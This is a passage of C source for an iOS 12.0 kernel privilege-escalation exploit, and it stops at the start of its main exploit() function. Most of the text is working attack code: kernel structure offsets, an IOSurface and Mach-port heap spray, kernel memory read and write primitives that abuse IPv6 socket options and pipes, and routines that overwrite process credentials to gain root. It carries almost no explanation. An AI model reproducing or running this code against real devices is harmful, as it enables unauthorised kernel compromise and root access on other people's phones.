//
//  exploit.c
//  se12.0exploit
//
//  Created by Justin Sherman on 1/13/20.
//  Copyright Â© 2020 Justin Sherman. All rights reserved.
//

/* #include <arpa/inet.h> */
#include <CoreFoundation/CoreFoundation.h>
#include <errno.h>
#include <net/if.h>
#include <pthread/pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "array.h"
#include "exploit.h"

unsigned int bits(unsigned int number, unsigned int start, unsigned int end){
    unsigned int amount = (end - start) + 1;
    unsigned int mask = ((1 << amount) - 1) << start;

    return (number & mask) >> start;
}

static const int PROC_TASK_OFFSET = 0x10;
static const int PROC_PID_OFFSET = 0x60;
static const int PROC_UCRED_OFFSET = 0xf8;

static const int TASK_VMMAP_OFFSET = 0x20;
static const int TASK_ITK_REGISTERED_OFFSET = 0x2e8;
static const int TASK_BSDINFO_OFFSET = 0x358;

static const int POSIX_CRED_CR_UID_OFFSET = 0x18;
static const int POSIX_CRED_CR_RUID_OFFSET = 0x1c;
static const int POSIX_CRED_CR_SVUID_OFFSET = 0x20;
static const int POSIX_CRED_CR_RGID_OFFSET = 0x68;
static const int POSIX_CRED_CR_SVGID_OFFSET = 0x6c;

static const int UCRED_CR_LABEL_OFFSET = 0x78;

/* pipe stuff */
static const int PIPE_PIPEBUF_BUFFER_OFF = 0x10;
/* these offsets were found in fp_getfvp */
static const int PROC_P_FD_OFFSET = 0x100;
static const int FILEDESC_FD_OFILES_OFFSET = 0;
static const int FILEDESC_FD_NFILES_OFFSET = 0x48;
static const int FILEPROC_F_FGLOB_OFFSET = 0x8;
/* these offsets were found in mac_file_setxattr */
static const int FILEGLOB_FG_OPS_OFFSET = 0x28;
static const int FILEGLOB_FO_TYPE_OFFSET = 0;
static const int FILEGLOB_FG_DATA_OFFSET = 0x38;

/* so we can tell which pipe we wrote to if our process has multiple pipes */
static const uint64_t FAKE_TASK_PIPE_MAGIC = 0x1133557799bbddff;
static const uint64_t FAKE_TASK_PIPE_MAGIC_PART2 = 0xffddbb9977553311;

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            return 1; \
        } \
    } while (0)

/* setsockopt accepts vals [1-255], this is arbitrary */
static const int INITIAL_TCLASS = 1;

static const uint32_t MINMTU_MAGIC = 0xcafe;
static const uint32_t MINMTU_MAGIC_MASK = 0xffff0000;
static const uint32_t MINMTU_PIPEIDX_MASK = 0x0000ffff;

#define MAGIC_FROM_MINMTU(minmtu) (((minmtu) & MINMTU_MAGIC_MASK) >> 16)
#define PIPEIDX_FROM_MINMTU(minmtu) ((minmtu) & MINMTU_PIPEIDX_MASK)

static const uint64_t LEAKED_PORT_CONTEXT = 0x1122334455667788;

/* I use ipc_port->ip_context to store metadata about where our fake port got
 * reallocated.
 *       |63                           32 31|                             0
 *       ******************************** *********************************
 *           fake port context magic                idx of pipe
 *
 */
static const vm_address_t CONTEXT_MAGIC_MASK = 0xffffffff00000000;
static const vm_address_t CONTEXT_PIPEIDX_MASK = 0x00000000ffffffff;
static const vm_address_t CONTEXT_MAGIC = 0xaabbccdd;

#define MAGIC_FROM_CONTEXT(ctx) (((ctx) & CONTEXT_MAGIC_MASK) >> 32)
#define PIPEIDX_FROM_CONTEXT(ctx) ((ctx) & CONTEXT_PIPEIDX_MASK)

/* static vm_size_t PAGESIZE = 0; */

static const char *HOSTNAME = NULL;

static kern_return_t create_IOSurface_client(mach_port_t *client_out,
        uint32_t *surface_id_out){
    CFMutableDictionaryRef matching_dict = IOServiceMatching("IOSurfaceRoot");

    if(!matching_dict)
        return KERN_FAILURE;

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            matching_dict);

    if(service == IO_OBJECT_NULL)
        return KERN_FAILURE;

    io_connect_t client = IO_OBJECT_NULL;
    kern_return_t kret = IOServiceOpen(service, mach_task_self(), 0, &client);

    if(kret)
        return kret;

    uint32_t dict[] = {
        kOSSerializeBinarySignature,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        kOSSerializeString | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, /* "IOSurfaceAllocSize" */
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000, 0x0,
    };

    /* iPhone 8,4 iOS 12.0 (16A366) */
    size_t surface_sz = strcmp(HOSTNAME, "blue") == 0 ? 0x3c8 : 0xdd0;
    char *surface = malloc(surface_sz);
    kret = IOConnectCallStructMethod(client, IOSURFACE_CREATE, dict, sizeof(dict),
            surface, &surface_sz);

    if(kret)
        return kret;

    *surface_id_out = *(uint32_t *)((uint8_t *)surface +
            (strcmp(HOSTNAME, "blue") == 0 ? 0x10 : 0x18));

    free(surface);
    surface = NULL;

    *client_out = client;

    return KERN_SUCCESS;
}

static size_t SPRAY_DICT_SZ = 0;
static int SPRAY_DICT_KALLOC_ZONE = 512;
static size_t PAGES_TO_SPRAY = 1000;

static void create_spray_dict(kport_t *fakeport, uint32_t surface_id,
        char **spray_dict_out){
    // XXX kalloc.4096
    const uint32_t OSString_len = SPRAY_DICT_KALLOC_ZONE;

    size_t spray_dict_sz = (5 * sizeof(uint32_t)) +
        (1 * ((3 * sizeof(uint32_t)) + OSString_len));

    uint32_t *spray_dict = malloc(spray_dict_sz);
    const uint32_t *spray_dict_start = spray_dict;

    *(spray_dict)++ = surface_id;
    *(spray_dict)++ = 0;
    *(spray_dict)++ = kOSSerializeBinarySignature;
    *(spray_dict)++ = kOSSerializeArray | 1 | kOSSerializeEndCollection;
    *(spray_dict)++ = kOSSerializeDictionary | PAGES_TO_SPRAY | kOSSerializeEndCollection;

    for(uint32_t i=0; i<PAGES_TO_SPRAY; i++){
        *(spray_dict)++ = kOSSerializeSymbol | 4;
        /* key */
        *(spray_dict)++ = i;
        *spray_dict = kOSSerializeString | (OSString_len - 1);

        if(i+1 == PAGES_TO_SPRAY)
            *spray_dict |= kOSSerializeEndCollection;

        spray_dict++;

        const uint8_t *current_OSString_end = (uint8_t *)spray_dict +
            (OSString_len - 1);

        uint32_t fakeport_off = 0;

        while((uint8_t *)spray_dict + sizeof(kport_t) < current_OSString_end){
            memcpy(spray_dict, fakeport, sizeof(kport_t));
            spray_dict += (sizeof(kport_t) / sizeof(uint32_t));
        }

        while(spray_dict < current_OSString_end)
            *(spray_dict)++ = 0x41414141;
    }

    *spray_dict_out = spray_dict_start;
}

static mach_port_t kalloc(int len){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);
    if(kret){
        /* printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret)); */
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int port_count = len / 8;
    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    free(oolmsg);
    free(ports);

    if(kret){
        /* printf("%s: mach_msg kret %s\n", __func__, mach_error_string(kret)); */
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static mach_port_t kalloc_with_port(int len, mach_port_t port){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);
    if(kret){
        printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    struct ool_msg {
        mach_msg_header_t hdr;
        mach_msg_body_t body;
        mach_msg_ool_ports_descriptor_t ool_port_desc;
    };

    int port_count = len / 8;
    /* mach_port_t *ports = calloc(port_count, sizeof(mach_port_t)); */
    mach_port_t *ports = malloc(sizeof(mach_port_t) * port_count);

    for(int i=0; i<port_count; i++)
        ports[i] = port;

    struct ool_msg *oolmsg = malloc(sizeof(struct ool_msg));
    oolmsg->hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg->hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg->hdr.msgh_remote_port = recv_port;
    oolmsg->hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg->hdr.msgh_id = 0xaabbccdd;
    oolmsg->body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg->ool_port_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg->hdr, MACH_SEND_MSG, sizeof(*oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    free(oolmsg);
    free(ports);

    if(kret){
        printf("%s: mach_msg kret %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static int create_vulnerable_socket(void){
    int s = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

    if(s == -1){
        printf("error creating socket: %s\n", strerror(errno));
        return -1;
    }

    struct so_np_extensions ex = {
        .npx_flags = SONPX_SETOPTSHUT,
        .npx_mask = SONPX_SETOPTSHUT
    };
    
    int err = setsockopt(s, SOL_SOCKET, SO_NP_EXTENSIONS, &ex, sizeof(ex));

    if(err == -1){
        printf("first setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int minmtu = IP6PO_MINMTU_ALL;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_USE_MIN_MTU, &minmtu, sizeof(minmtu));

    if(err == -1){
        printf("second setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int prefer_tempaddr = IP6PO_TEMPADDR_PREFER;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, &prefer_tempaddr,
            sizeof(prefer_tempaddr));

    if(err == -1){
        printf("third setsockopt: %s\n", strerror(errno));
        return -1;
    }

    int tclass = INITIAL_TCLASS;
    err = setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));

    if(err == -1){
        printf("fourth setsockopt: %s\n", strerror(errno));
        return -1;
    }

    return s;
}

static int get_minmtu(int socket, uint32_t *minmtu){
    socklen_t minmtu_sz = sizeof(*minmtu);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &minmtu_sz);
}

static int get_prefer_tempaddr(int socket, uint32_t *prefer_tempaddr){
    socklen_t sz = sizeof(*prefer_tempaddr);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefer_tempaddr, &sz);
}

static int get_tclass(int socket, uint32_t *tclass){
    socklen_t sz = sizeof(*tclass);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_TCLASS, tclass, &sz);
}

static int increase_file_limit(void){
    struct rlimit rl = {0};

    int err = getrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: getrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    rl.rlim_cur = OPEN_MAX;
    rl.rlim_max = rl.rlim_cur;

    err = setrlimit(RLIMIT_NOFILE, &rl);

    if(err){
        printf("%s: setrlimit: %s\n", __func__, strerror(errno));
        return err;
    }

    return 0;
}

static int _EarlyKernelRead64(int s, int *p, uint64_t kaddr, uint64_t *out){
    struct ip6_pktopts old_pktopts = {0};
    ssize_t r = read(p[0], &old_pktopts, sizeof(old_pktopts));

    if(r == -1){
        printf("%s: read old_pktopts %s\n", __func__, strerror(errno));
        return r;
    }

    struct ip6_pktopts new_pktopts = {0};
    new_pktopts.ip6po_pktinfo = kaddr;

    ssize_t w = write(p[1], &new_pktopts, sizeof(new_pktopts));

    if(w == -1){
        printf("%s: write new_pktopts %s\n", __func__, strerror(errno));
        return w;
    }
    
    struct in6_pktinfo info = {0};
    socklen_t infosz = sizeof(info);

    int err = getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &info, &infosz);

    if(err == -1){
        printf("%s: getsockopt with pktinfo @ %#llx: %s\n", __func__, kaddr,
                strerror(errno));
        return 1;
    }

    /* I know I get 20 bytes from this, but reading 20 bytes at a time is weird */
    *out = *(uint64_t *)&info;

    return 0;
}

static int _EarlyKernelRead32(int s, int *p, uint64_t kaddr, uint32_t *out){
    uint64_t out64 = 0;

    if(_EarlyKernelRead64(s, p, kaddr, &out64))
        return 1;

    *out = *(uint32_t *)&out64;

    return 0;
}

static int _EarlyKernelReadN(int s, int *p, uint64_t kaddr, uint8_t *out,
        size_t length){
    if(length % sizeof(uint32_t) != 0){
        printf("%s: length needs to be divisible by %d\n", __func__,
                sizeof(uint32_t));
        return 1;
    }

    uint64_t current_loc = kaddr;
    uint64_t end = kaddr + length;

    size_t bytes_read = 0;
    size_t bytes_left = length;

    int ret = 0;

    while(current_loc < end && ret == 0){
        size_t chunk = sizeof(uint32_t);

        if(chunk > bytes_left)
            chunk = bytes_left;

        uint32_t out32 = 0;
        ret = _EarlyKernelRead32(s, p, current_loc, &out32);

        *(uint32_t *)(out + bytes_read) = out32;

        bytes_read += chunk;
        current_loc += chunk;
        bytes_left -= chunk;
    }

    return ret;
}

static void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

static int _EarlyKernelWrite32(int s, int *p, uint64_t kaddr, uint32_t data){
    struct ip6_pktopts old_pktopts = {0};
    ssize_t r = read(p[0], &old_pktopts, sizeof(old_pktopts));

    if(r == -1){
        printf("%s: read old_pktopts %s\n", __func__, strerror(errno));
        return r;
    }

    struct ip6_pktopts new_pktopts = {0};
    new_pktopts.ip6po_pktinfo = kaddr;

    ssize_t w = write(p[1], &new_pktopts, sizeof(new_pktopts));

    if(w == -1){
        printf("%s: write new_pktopts %s\n", __func__, strerror(errno));
        return w;
    }

    /* this is gonna write 20 bytes, so save the last 16 and append to the
     * data buffer
     */
    uint8_t last16[16] = {0};
    _EarlyKernelReadN(s, p, kaddr + 4, last16, sizeof(last16));

    uint8_t data_buf[sizeof(struct ip6_pktopts)] = {0};
    memcpy(data_buf, &data, sizeof(data));
    memcpy(data_buf + 4, last16, sizeof(last16));

    /*
typedef struct in6_addr {
	union {
		__uint8_t   __u6_addr8[16];
		__uint16_t  __u6_addr16[8];
		__uint32_t  __u6_addr32[4];
	} __u6_addr;
} in6_addr_t;

#define	s6_addr   __u6_addr.__u6_addr8
#ifdef KERNEL
#define	s6_addr8  __u6_addr.__u6_addr8
#define	s6_addr16 __u6_addr.__u6_addr16
#define	s6_addr32 __u6_addr.__u6_addr32
*/

    struct in6_pktinfo pktinfo = *(struct in6_pktinfo *)data_buf;
#define SET_UNSPECIFIED(a) \
    *(__uint32_t *)(void *)(&(a)->s6_addr[0]) = 0; \
    *(__uint32_t *)(void *)(&(a)->s6_addr[4]) = 0; \
    *(__uint32_t *)(void *)(&(a)->s6_addr[8]) = 0; \
    *(__uint32_t *)(void *)(&(a)->s6_addr[12]) = 0
    SET_UNSPECIFIED(&pktinfo.ipi6_addr);
    pktinfo.ipi6_ifindex = 0;

    printf("%s: unspecified? %d\n", __func__,
            !IN6_IS_ADDR_UNSPECIFIED(&pktinfo.ipi6_addr));

    int err = setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &pktinfo, sizeof(pktinfo));

    if(err == -1){
        printf("%s: setsockopt failed: %s\n", __func__, strerror(errno));
        return 1;
    }

    return 0;
}

static int _EarlyKernelWrite64(int s, int *p, uint64_t kaddr, uint64_t data){
    struct ip6_pktopts old_pktopts = {0};
    ssize_t r = read(p[0], &old_pktopts, sizeof(old_pktopts));

    struct ip6_pktopts new_pktopts = {0};
    new_pktopts.ip6po_pktinfo = kaddr;

    ssize_t w = write(p[1], &new_pktopts, sizeof(new_pktopts));

    struct in6_pktinfo pktinfo = {0};

    pktinfo.ipi6_ifindex = 1;

    /* printf("pktinfo struct:\n"); */
    /* DumpHex(&pktinfo, sizeof(pktinfo)); */

    int err = setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &pktinfo, sizeof(pktinfo));

    if(err == -1){
        printf("%s: setsockopt failed: %s\n", __func__, strerror(errno));
        return 1;
    }

    return 0;
}

static int _DumpKernelMemory(int s, int *p, uint64_t kaddr, uint32_t len){
    int ret = 0;

    uint32_t bytes_dumped = 0;
    uint64_t current_loc = kaddr;

    while(bytes_dumped < len){
        enum { row_size = 0x10 };

        uint64_t val1 = 0;
        uint64_t val2 = 0;

        ret = _EarlyKernelRead64(s, p, current_loc, &val1);

        if(ret)
            return ret;

        ret = _EarlyKernelRead64(s, p, current_loc + 8, &val2);

        if(ret)
            return ret;

        uint64_t *buf1 = &val1;
        uint64_t *buf2 = &val2;

        int current_row_length = len - bytes_dumped;

        if(current_row_length >= row_size)
            current_row_length = row_size;

        printf("  %#llx: ", current_loc);

        for(int i=0; i<current_row_length / 2; i++)
            printf("%02x ", *(uint8_t *)((uint8_t *)buf1 + i));
        for(int i=current_row_length / 2; i<current_row_length; i++)
            printf("%02x ", *(uint8_t *)((uint8_t *)buf2 + (i-(current_row_length/2))));

        /* Print filler spaces.
         * Two spaces for would be '%02x', one more for the space after.
         */
        for(int i=current_row_length; i<row_size; i++)
            printf("   ");

        printf("  ");

        for(int i=0; i<current_row_length / 2; i++){
            uint8_t cur_char = *(uint8_t *)((uint8_t *)buf1 + i);
            if(isgraph(cur_char))
                printf("%c", cur_char);
            else
                printf(".");
        }
        for(int i=current_row_length / 2; i<current_row_length; i++){
            uint8_t cur_char = *(uint8_t *)((uint8_t *)buf2 + (i-(current_row_length/2)));
            if(isgraph(cur_char))
                printf("%c", cur_char);
            else
                printf(".");
        }

        printf("\n");

        bytes_dumped += row_size;
        current_loc += row_size;
    }

    return ret;
}

#define EarlyKernelRead32(kaddr, out) _EarlyKernelRead32(evil_socket, evil_pipe, (kaddr), (out))
#define EarlyKernelRead64(kaddr, out) _EarlyKernelRead64(evil_socket, evil_pipe, (kaddr), (out))
#define EarlyKernelReadN(kaddr, out, len)  _EarlyKernelReadN(evil_socket, evil_pipe, (kaddr), (out), (len))
#define EarlyKernelWrite32(kaddr, data) _EarlyKernelWrite32(evil_socket, evil_pipe, (kaddr), (data))
#define EarlyKernelWrite64(kaddr, data) _EarlyKernelWrite64(evil_socket, evil_pipe, (kaddr), (data))
#define DumpKernelMemory(kaddr, len) _DumpKernelMemory(evil_socket, evil_pipe, (kaddr), (len))

static kern_return_t KernelRead(mach_port_t tfp0, vm_address_t kaddr,
       void *buffer, vm_size_t length){
    vm_address_t current_loc = kaddr;
    vm_address_t end = kaddr + length;

    vm_size_t bytes_read = 0;
    vm_size_t bytes_left = length;

    kern_return_t kret = KERN_SUCCESS;

    while(current_loc < end && kret == KERN_SUCCESS){
        vm_size_t chunk = 0x100;

        if(chunk > bytes_left)
            chunk = bytes_left;

        kret = vm_read_overwrite(tfp0, current_loc, chunk,
                (vm_address_t)((uint8_t *)buffer + bytes_read), &chunk);

        bytes_read += chunk;
        current_loc += chunk;
        bytes_left -= chunk;
    }

    return kret;
}

static kern_return_t KernelWrite(mach_port_t tfp0, vm_address_t kaddr,
        uint64_t data, mach_msg_type_number_t size){
    return vm_write(tfp0, kaddr, (vm_offset_t)&data, size);
}

static int _proc_pipes(int evil_socket, int *evil_pipe, uint64_t ourproc,
        uint64_t **pipes_out, int *pipecnt_out){
    uint64_t p_fd = 0;
    EarlyKernelRead64(ourproc + PROC_P_FD_OFFSET, &p_fd);

    uint64_t fd_ofiles = 0;
    EarlyKernelRead64(p_fd + FILEDESC_FD_OFILES_OFFSET, &fd_ofiles);

    uint32_t fd_nfiles = 0;
    EarlyKernelRead32(p_fd + FILEDESC_FD_NFILES_OFFSET, &fd_nfiles);

    int pipecnt = 0;
    uint64_t *pipes = NULL;

    for(uint32_t i=0; i<fd_nfiles; i++){
        uint64_t cur_ofile = 0;
        EarlyKernelRead64(fd_ofiles + (i * sizeof(void *)), &cur_ofile);

        if(!cur_ofile)
            continue;

        uint64_t f_fglob = 0;
        EarlyKernelRead64(cur_ofile + FILEPROC_F_FGLOB_OFFSET, &f_fglob);

        if(!f_fglob)
            continue;

        uint64_t fg_ops = 0;
        EarlyKernelRead64(f_fglob + FILEGLOB_FG_OPS_OFFSET, &fg_ops);


        uint32_t fo_type = 0;
        EarlyKernelRead32(fg_ops + FILEGLOB_FO_TYPE_OFFSET, &fo_type);

        
        uint64_t fg_data = 0;
        EarlyKernelRead64(f_fglob + FILEGLOB_FG_DATA_OFFSET, &fg_data);


        if(fo_type == DTYPE_PIPE){
            /* fg_data points to a pipe struct */

            if(!pipes)
                pipes = malloc(sizeof(uint64_t) * ++pipecnt);
            else{
                uint64_t *pipes_rea = realloc(pipes, sizeof(uint64_t) * ++pipecnt);
                pipes = pipes_rea;
            }

            pipes[pipecnt - 1] = fg_data;
        }
    }

    *pipes_out = pipes;
    *pipecnt_out = pipecnt;
    
    return 0;
}

#define proc_pipes(pipes_out, pipecnt_out) _proc_pipes(evil_socket, evil_pipe, \
        myproc_kaddr, (pipes_out), (pipecnt_out))

static void _cleanup(int **pipes, int num_pipes, int *sockets,
        int num_sockets, mach_port_t **pagesize_kallocs,
        int num_pagesize_kallocs, mach_port_t *kalloc_512s,
        int num_kalloc_512s){
    for(int i=0; i<num_pipes; i++){
        close(*pipes[i]);
        close(*(pipes[i] + 1));
        free(pipes[i]);
    }

    for(int i=0; i<num_sockets; i++)
        close(sockets[i]);

    /* for(int i=0; i<num_pagesize_kallocs; i++) */
    /*     mach_port_destroy(mach_task_self(), (*pagesize_kallocs)[i]); */

    /* free(*pagesize_kallocs); */

    /* for(int i=0; i<num_kalloc_512s; i++) */
    /*     mach_port_destroy(mach_task_self(), kalloc_512s[i]); */
}

#define CLEANUP _cleanup(pipes, num_pipes, sockets, num_sockets, \
        &pagesize_kallocs, num_pagesize_kallocs, kalloc_512s, num_kalloc_512s)

#define POST_EXPLOIT_CLEANUP \
    do { \
        (void)0; \
        /* for(int i=0; i<num_kalloc_512s; i++) \ */ \
        /*     mach_port_destroy(mach_task_self(), kalloc_512s[i]); \ */ \
    } while (0)

static int kptr_compar(const void *a, const void *b){
    const void *kptr_a = *(const void **)a;
    const void *kptr_b = *(const void **)b;

    if(kptr_a < kptr_b)
        return -1;
    else if(kptr_a > kptr_b)
        return 1;
    else
        return 0;
}

static int kptr_compar2(const void *a, const void *b){
    const uint64_t kptr_a = *(uint64_t *)a;
    const uint64_t kptr_b = *(uint64_t *)b;

    /* printf("%#llx vs %#llx\n", kptr_a, kptr_b); */

    if(kptr_a < kptr_b)
        return -1;
    else if(kptr_a > kptr_b)
        return 1;
    else
        return 0;
}

#define CHECK_ERROR(err, errmsg, ...) \
    do { \
        if((err)){ \
            printf(errmsg, ##__VA_ARGS__); \
            return 1; \
        } \
    } while (0)

static int root(mach_port_t tfp0, uint64_t creds, uid_t *orig_uid,
        uid_t *orig_ruid, uid_t *orig_svuid, gid_t *orig_rgid, gid_t *orig_svgid){
    kern_return_t kret = KernelRead(tfp0, creds + POSIX_CRED_CR_UID_OFFSET,
            orig_uid, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_uid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_RUID_OFFSET, orig_ruid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_ruid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_SVUID_OFFSET, orig_svuid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svuid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_RGID_OFFSET, orig_rgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_rgid: %s\n",
            mach_error_string(kret));

    kret = KernelRead(tfp0, creds + POSIX_CRED_CR_SVGID_OFFSET, orig_svgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svgid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_UID_OFFSET, 0, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_uid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RUID_OFFSET, 0, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_ruid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVUID_OFFSET, 0, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svuid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RGID_OFFSET, 0, sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_rgid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVGID_OFFSET, 0, sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't zero out ourproc->p_ucred->cr_posix.cr_svgid: %s\n",
            mach_error_string(kret));

    return 0;
}

static int unroot(mach_port_t tfp0, uint64_t creds, uid_t orig_uid,
        uid_t orig_ruid, uid_t orig_svuid, gid_t orig_rgid, gid_t orig_svgid){
    kern_return_t kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_UID_OFFSET,
            orig_uid, sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_uid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RUID_OFFSET, orig_ruid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_ruid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVUID_OFFSET, orig_svuid,
            sizeof(uid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_svuid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_RGID_OFFSET, orig_rgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_rgid: %s\n",
            mach_error_string(kret));

    kret = KernelWrite(tfp0, creds + POSIX_CRED_CR_SVGID_OFFSET, orig_svgid,
            sizeof(gid_t));

    CHECK_ERROR(kret, "Couldn't restore ourproc->p_ucred->cr_posix.cr_svgid: %s\n",
            mach_error_string(kret));

    return 0;
}

int exploit(mach_port_t *tfp0out){
    SPRAY_DICT_SZ = (5 * sizeof(uint32_t)) +
        (1 * ((3 * sizeof(uint32_t)) + SPRAY_DICT_KALLOC_ZONE));
    vm_size_t pagesize;
    _host_page_size(mach_host_self(), &pagesize);

    increase_file_limit();

    /* printf("sizeof(struct ip6_pktopts) = %#x\n", sizeof(struct ip6_pktopts)); */
    /* printf("offsetof(struct ip6_pktopts,  ip6po_m) = %#x\n", offsetof(struct ip6_pktopts,  ip6po_m)); */
